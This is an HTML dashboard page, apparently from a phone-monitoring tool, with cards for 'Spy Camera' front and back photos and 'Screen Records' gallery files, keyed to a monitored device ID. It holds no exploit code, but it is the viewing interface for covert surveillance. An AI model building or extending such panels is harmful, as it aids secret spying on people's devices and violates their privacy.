<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>File Manager</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* --- SAME DESIGN THEME --- */
        * { box-sizing: border-box; }
        body { 
            background-color: #0f0f0f; 
            background-image: linear-gradient(45deg, #000000, #1a1a1a); 
            color: #ffffff; 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0; 
            padding: 20px; 
            min-height: 100vh; 
        }

        /* HEADER */
        .header { 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            margin-bottom: 30px; 
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 15px;
        }
        .back-btn { 
            background: rgba(255, 255, 255, 0.05); 
            border: 1px solid rgba(255, 255, 255, 0.15); 
            color: #fff; 
            padding: 10px 15px; 
            border-radius: 12px; 
            cursor: pointer; 
            text-decoration: none; 
            font-size: 1rem; 
        }
        .page-title { 
            font-size: 1.2rem; 
            font-weight: bold; 
            color: #fff; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
        }

        /* MENU GRID */
        .menu-container {
            display: grid;
            grid-template-columns: 1fr; /* Mobile pe ek ke niche ek */
            gap: 20px;
            max-width: 600px;
            margin: 0 auto;
        }

        /* CARD DESIGN */
        .menu-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .menu-card:hover {
            background: rgba(255, 255, 255, 0.08);
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }

        .card-icon {
            width: 60px;
            height: 60px;
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
        }

        .card-info {
            flex: 1;
            margin-left: 20px;
        }

        .card-title {
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 5px;
            color: #fff;
        }

        .card-desc {
            font-size: 0.85rem;
            color: #888;
        }

        .arrow-icon {
            color: #555;
            font-size: 1.2rem;
        }

        /* COLORS FOR SPECIFIC CARDS */
        /* Camera Card (Red Theme) */
        .card-camera .card-icon {
            background: rgba(255, 68, 68, 0.15);
            color: #ff4444;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        .card-camera:hover { border-color: #ff4444; }

        /* Screen Card (Blue Theme) */
        .card-screen .card-icon {
            background: rgba(0, 243, 255, 0.15);
            color: #00f3ff;
            border: 1px solid rgba(0, 243, 255, 0.3);
        }
        .card-screen:hover { border-color: #00f3ff; }

        /* ID Badge */
        .device-id-badge {
            text-align: center;
            margin-top: 40px;
            font-size: 0.8rem;
            color: #555;
            background: rgba(0,0,0,0.3);
            padding: 8px;
            border-radius: 10px;
            display: inline-block;
        }
    </style>
</head>
<body>

    <div class="header">
        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-house"></i></a>
        <div class="page-title">Storage</div>
        <div style="width: 40px;"></div> 
    </div>

    <div class="menu-container">

        <div class="menu-card card-camera" onclick="openFolder('camera.html')">
            <div class="card-icon">
                <i class="fa-solid fa-eye"></i>
            </div>
            <div class="card-info">
                <div class="card-title">Spy Camera</div>
                <div class="card-desc">Front & Back Camera Photos</div>
            </div>
            <div class="arrow-icon"><i class="fa-solid fa-chevron-right"></i></div>
        </div>

        <div class="menu-card card-screen" onclick="openFolder('screenshot.html')">
            <div class="card-icon">
                <i class="fa-solid fa-mobile-screen"></i>
            </div>
            <div class="card-info">
                <div class="card-title">Screen Records</div>
                <div class="card-desc">Screenshots & Gallery Files</div>
            </div>
            <div class="arrow-icon"><i class="fa-solid fa-chevron-right"></i></div>
        </div>

    </div>

    <div style="text-align: center;">
        <div class="device-id-badge">
            Device ID: <span id="displayID">Connecting...</span>
        </div>
    </div>

    <script>
        // URL se ID nikalne ka logic
        const urlParams = new URLSearchParams(window.location.search);
        // Pehle URL check karega, nahi to LocalStorage check karega
        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');

        // ID display update karo
        const idLabel = document.getElementById('displayID');
        if (DEVICE_ID) {
            idLabel.innerText = DEVICE_ID;
            idLabel.style.color = "#00f3ff";
        } else {
            idLabel.innerText = "Not Found";
            idLabel.style.color = "#ff4444";
        }

        // Click karne par sahi page par bhejne wala function
        function openFolder(pageName) {
            if (DEVICE_ID) {
                // ID sath mein bhej raha hai
                window.location.href = `${pageName}?id=${DEVICE_ID}`;
            } else {
                alert("Device ID nahi mila! Dobara connect karein.");
                window.location.href = pageName;
            }
        }
    </script>

</body>
</html>
